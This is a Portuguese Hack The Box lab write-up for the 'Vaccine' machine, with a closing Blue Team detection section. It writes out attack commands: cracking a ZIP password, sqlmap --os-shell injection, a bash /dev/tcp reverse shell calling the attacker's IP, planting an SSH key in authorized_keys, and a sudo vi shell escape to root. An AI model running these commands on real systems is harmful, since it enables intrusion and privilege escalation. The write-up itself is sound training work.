# Vaccine — HTB

> Dificuldade: Very Easy | Plataforma: Hack The Box | SO: Linux | 
> Temas: FTP anônimo, quebra de hash de ZIP, hash MD5, SQL injection, reverse shell, persistência SSH, credenciais em texto puro, escalada via sudo/GTFOBins |
> Data: 27–28/09/2026 | Duração do lab: 02:30:00

**Relatório completo com prints:** [Vaccine — HTB (Notion)](https://swamp-bumper-5b5.notion.site/Vaccine-HTB-3e9977ff272b8046a399c7af3306b5b3?source=copy_link)

## Ferramentas utilizadas

- Nmap — reconhecimento de portas e serviços
- Cliente FTP — acesso anônimo e download do backup
- zip2john / John the Ripper — extração e quebra do hash do ZIP
- sqlmap — confirmação e exploração da SQL injection, com os-shell
- Netcat — listener para o reverse shell
- ssh-keygen / SSH — geração de chave e persistência de acesso
- grep — busca recursiva por credenciais no código-fonte

## Resumo

Vaccine encadeia uma sequência de falhas ligadas por um mesmo fio: má gestão
de credenciais. Um FTP anônimo entrega um backup protegido por senha fraca;
dentro dele, o código do site expõe o hash MD5 do admin, trivial de reverter.
Autenticado, o painel tem uma SQL injection que dá execução de comando via
sqlmap. A partir daí, um reverse shell e uma chave SSH plantada estabilizam o
acesso, a senha do banco aparece em texto puro no código, e uma regra de sudo
mal desenhada sobre o editor `vi` fecha o caminho até root.

## Reconhecimento

Comecei com um Nmap simples sobre o IP do alvo. Para a leitura inicial não há
motivo para um comando mais elaborado — a intenção é só ver o que a máquina
expõe antes de formar qualquer hipótese.

```nmap 10.129.95.174```


O resultado mostrou três portas TCP abertas:

- 21/tcp — FTP
- 22/tcp — SSH
- 80/tcp — HTTP

Cada porta abre uma hipótese. SSH e HTTP são o par mais comum de qualquer
Linux exposto; o FTP é o que salta aos olhos, porque um FTP num alvo de CTF
quase sempre guarda algo que não deveria estar acessível.


## Enumeração

O FTP foi o primeiro ponto a investigar, justamente por ser o serviço menos
esperado num servidor bem configurado. Testei o acesso anônimo — a conta
`anonymous`, que muitos servidores FTP aceitam com qualquer senha:

```ftp 10.129.95.174```


O login `anonymous` com senha vazia foi aceito, o que já é um achado: um FTP
que serve conteúdo sem autenticação real.


Uma vez dentro, o primeiro reflexo é enumerar o que está exposto antes de
qualquer outra coisa. Listei os arquivos:

```ls```


Apareceu um único arquivo: `backup.zip`. Um backup num FTP público é um cheiro
forte — arquivos de backup costumam carregar configuração, código ou
credenciais que não deveriam sair do servidor.

Baixei o arquivo. Aqui vale uma decisão de método: o FTP transfere em dois
modos, ASCII e binário, e o modo ASCII corrompe arquivos binários como um ZIP
ao "ajustar" quebras de linha durante a transferência. Se eu baixasse em
ASCII, o arquivo chegaria quebrado e eu perderia tempo achando que a senha
estava errada quando o problema seria o arquivo. Por isso forcei o modo
binário antes do download:

```binary
get backup.zip
```

## Exploração

O `backup.zip` estava protegido por senha. Em vez de tentar adivinhar, o
caminho é extrair o hash da senha do arquivo e quebrá-lo offline. A ferramenta
do ecossistema do John the Ripper que faz essa extração para arquivos
compactados é a `zip2john`. Ela cospe o hash na saída padrão, então redirecionei
o resultado para um arquivo:

```zip2john backup.zip > hash.txt```


Com o hash salvo, rodei o John contra a `rockyou`, a wordlist padrão da Kali
que resolve a grande maioria dos labs iniciais:

```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```


O John identificou o formato como `PKZIP` — um algoritmo antigo e fraco — e
quebrou a senha instantaneamente: `741852963`. O tipo de cifra explica a
velocidade: PKZIP não oferece resistência real a ataque por dicionário.

Extraí o conteúdo do ZIP com a senha encontrada:

```unzip backup.zip```


Saíram dois arquivos: `index.php` e `style.css`. O `index.php` é o alvo óbvio —
código de uma página de login costuma conter a lógica de autenticação. Ao
ler o arquivo, encontrei o trecho que valida o login:

```
```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```

O desenvolvedor guardou a senha como hash MD5 em vez de texto puro. É menos
inseguro que texto puro, mas MD5 é criptograficamente quebrado e rápido demais,
o que o torna trivial de reverter por rainbow table. Submeti o hash a um
serviço de lookup MD5 e recuperei a senha em claro: `qwerty789`.


Com `admin` / `qwerty789`, acessei o painel diretamente pela URL do IP, sem
necessidade de mexer em DNS ou `/etc/hosts` — o alvo responde pelo IP puro. O
painel é um catálogo de carros com um campo de busca, e é nesse campo que mora
a próxima vulnerabilidade.

Para atacar a busca com o sqlmap, capturei a requisição autenticada. Como é um
GET com o parâmetro na URL, bastou o valor do cookie de sessão (`PHPSESSID`),
pego no DevTools do navegador — sem ele o sqlmap cairia na tela de login. Montei:

```sqlmap -u "http://10.129.95.174/dashboard.php?search=test" --cookie="PHPSESSID=<valor>" --os-shell --batch```


O sqlmap confirmou o backend como PostgreSQL e o parâmetro `search` como
injetável por vários vetores, incluindo *stacked queries* — o que viabiliza
execução de comando no sistema operacional. A flag que pede esse shell é a
`--os-shell`, resposta da task de command execution.


O `--os-shell` me deixou num prompt de execução de comando. Confirmei a
identidade com `whoami` e obtive `postgres` — o usuário do serviço de banco.

## Comprometimento

O os-shell do sqlmap é um shell cego, sem TTY: executa cada comando isolado e
não é um terminal interativo. Isso trava qualquer coisa que dependa de
terminal, como o `sudo` pedir senha. Para ganhar um shell utilizável, montei um
reverse shell — em vez de eu entrar na máquina, faço a máquina se conectar de
volta a mim. A inversão importa porque firewalls costumam bloquear conexões
entrando na vítima, mas liberam as que saem dela.

Do meu lado, um listener escutando na porta 4444:

```nc -lvnp 4444```


No os-shell, o payload que manda a vítima abrir um bash conectado ao meu IP:

```bash -c 'bash -i >& /dev/tcp/10.10.14.115/4444 0>&1'```


O `/dev/tcp` é um recurso do próprio bash que cria a conexão de rede sem
precisar instalar nada na vítima. Um detalhe que custou tempo entre as sessões:
o payload carrega dois IPs — o do alvo (no comando do sqlmap) e o meu (no
payload) — e ao reconectar a VPN meu IP mudou. Apontar o payload para o IP
antigo faz a vítima ligar para um número que não atende.

O listener recebeu a conexão como `postgres`. O upgrade de TTY padrão seria via
`python3 -c 'import pty; pty.spawn("/bin/bash")'`, mas nesse caso ele ficou
instável, então parti direto para a jogada que resolve o problema de raiz:
persistência via SSH. Exploração dá o primeiro acesso; persistência dá acesso
confiável, sem depender de refazer a cadeia toda a cada queda de shell.

Gerei um par de chaves na minha máquina:

```ssh-keygen -t ed25519 -f ~/.ssh/vaccine -N ""```


E plantei a chave pública no `authorized_keys` do postgres, numa única linha
encadeada para não depender do shell frágil. Um cuidado essencial: o SSH ignora
silenciosamente a chave se as permissões estiverem frouxas, então travei o
diretório e o arquivo:

```mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA... l0gspew@kali' > ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && echo PRONTO```


Com a chave no lugar, entrei por SSH com um shell estável e TTY nativo:

```ssh -i ~/.ssh/vaccine postgres@10.129.95.174```


Com acesso confiável, faltava escalar. Rodei `sudo -l`, mas a senha do banco
(`qwerty789`) não servia — porque aquela era a senha do PostgreSQL, não da
conta de sistema. A senha de sistema estava em texto puro no código do site.
Caçei com busca recursiva no diretório servido pelo Apache:

```grep -r "password" /var/www/html```


O `dashboard.php` continha a string de conexão do banco:

```
```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

A senha `P@s5w0rd!` era a do banco — e funcionou também na conta de sistema,
porque o admin reusou a mesma senha nos dois lugares. Esse reúso é o fio
condutor de todo o box. Com ela, o `sudo -l` finalmente respondeu:
```
User postgres may run the following commands on vaccine:
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

O postgres pode rodar o editor `vi` como root, restrito a um arquivo de
configuração.


A intenção do admin parecia inofensiva — "editar só este arquivo". O problema é
que o `vi` é poderoso demais: consegue executar comandos do sistema de dentro
dele. Rodando como root, qualquer shell que ele dispare nasce root. O GTFOBins
documenta exatamente essa fuga. Abri o vi da forma exata que a regra de sudo
permite (rodar sem o argumento do arquivo é bloqueado, porque o sudo compara a
linha inteira):
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

E, já dentro do editor, escapei para um shell com:
```
:!/bin/sh
```

O `:` entra no modo de comando do vi, o `!` executa um comando de shell, e o
`sh` resultante herda o privilégio de root. O prompt virou `#` e o `id`
confirmou:
```
uid=0(root) gid=0(root) groups=0(root)
```

Com root, li as duas flags — a de usuário no home do postgres e a de root:
```
cat /var/lib/postgresql/user.txt
cat /root/root.txt

```
## Perspectiva Blue Team

Cada etapa desta cadeia deixa rastro, e vale percorrê-las do ponto de vista de
quem defende.

**FTP anônimo servindo um backup.** A raiz de tudo é uma exposição de postura:
um serviço que aceita login anônimo e serve um arquivo sensível. Isso é achado
de auditoria, não de tempo real — revisão de configuração do FTP e do que ele
expõe pega o problema antes de qualquer ataque. No plano de rede, uma conexão
FTP anônima seguida de download de arquivo é telemetria que vale monitorar,
especialmente vinda de um IP externo desconhecido.

**Quebra de hash offline.** A extração e quebra do ZIP acontece na máquina do
atacante, fora do alcance do defensor — é justamente por isso que credenciais
fracas em arquivos acessíveis são tão perigosas: não há evento a detectar. A
defesa aqui é preventiva: não deixar backups com senha fraca em serviço
público, e não guardar hash MD5 de senha em código.

**SQL injection via sqlmap.** A varredura do sqlmap gera um volume anômalo de
requisições ao `dashboard.php` com payloads característicos na query string —
`CAST`, `PG_SLEEP`, aspas e comentários SQL em sequência rápida. Regras sobre
logs de acesso web, procurando padrões de injeção e picos de requisições a um
mesmo parâmetro, sinalizam a atividade. É o tipo de evento que o Wazuh captura
decodificando logs do Apache.

**Execução de comando via os-shell.** O sqlmap, ao habilitar o `--os-shell` em
PostgreSQL, usa `COPY ... FROM PROGRAM` para executar comandos — o processo do
banco passa a gerar processos filhos de shell, comportamento que um servidor de
banco legítimo não tem. Telemetria de criação de processo no host (auditd)
revelaria o PostgreSQL disparando `sh`, uma assinatura forte.

**Reverse shell.** A conexão de saída é o sinal mais claro de toda a cadeia: um
servidor de banco de dados iniciando uma conexão para um IP externo numa porta
alta incomum (4444) não tem justificativa legítima. Monitoramento de conexões
de rede de saída, especialmente partindo de processos que não deveriam abrir
sockets externos, alertaria na hora.

**Persistência via chave SSH.** A escrita do `authorized_keys` é um evento de
alto valor: um arquivo de credencial SSH sendo criado ou modificado fora de um
processo de administração legítimo. Monitoramento de integridade de arquivo
(FIM) sobre os diretórios `.ssh` dos usuários pega essa alteração — é
exatamente o tipo de regra que o Wazuh aplica com FIM. Logins SSH por chave
recém-criada, seguidos de atividade, reforçam o alerta.

**Escalada via sudo/vi.** O uso de sudo é logado pelo próprio sistema. Um `sudo`
executando `vi` seguido, no mesmo intervalo, de um processo `sh` filho é um
padrão reconhecível de escape de shell via editor. Regras sobre logs de sudo
combinadas com telemetria de criação de processo sinalizam a fuga — e a
configuração de sudo em si é um achado de auditoria: permitir um editor como
comando privilegiado é uma má prática conhecida.

## Lições Aprendidas

- O comprometimento não veio de uma falha única, mas de uma cadeia de más
gestões de credencial: senha fraca no ZIP, hash MD5 no código, senha do banco
em texto puro e reúso da mesma senha na conta de sistema. Cada elo sozinho
parecia pequeno; juntos, entregaram root.
- Reúso de senha entre serviços diferentes (banco e sistema) foi o que
transformou uma credencial encontrada por acaso em escalada de privilégio.
- Exploração dá o primeiro acesso; persistência dá acesso confiável. Plantar
uma chave SSH cedo transforma um shell frágil e volátil em acesso estável, e
evita refazer toda a cadeia a cada queda de conexão.
- Um binário aparentemente inofensivo liberado no sudo pode ser um caminho
direto para root, se ele permite escape para shell. Editores, paginadores e
interpretadores entram nessa categoria — o GTFOBins cataloga quais.
- Um reverse shell carrega dois IPs; ao mudar de ambiente, confirmar ambos
antes de disparar economiza depuração no lugar errado.
